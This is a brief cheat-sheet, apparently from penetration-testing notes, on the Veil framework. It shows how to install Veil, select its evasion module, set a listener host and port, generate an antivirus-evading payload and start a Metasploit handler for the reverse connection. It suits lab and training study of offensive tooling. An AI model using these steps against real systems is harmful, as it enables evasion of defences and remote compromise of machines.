# Veil

### Download veil from github

```bash
apt -y install veil
/usr/share/veil/config/setup.sh --force --silent
```

### Usage&#x20;

#### Start Veil

```bash
veil
```

#### Find out information about a module

```bash
info evasion
```

#### To use a module

```bash
use evasion
```

#### Set arguments

```bash
set lhost 192.168.119.138
set lport 443
```

#### Create the payload

```bash
generate
```

#### Setting up Metasploit handler

<pre class="language-bash"><code class="lang-bash"><strong>msfconsole -r /var/lib/veil/output/handlers/payload.rc
</strong></code></pre>
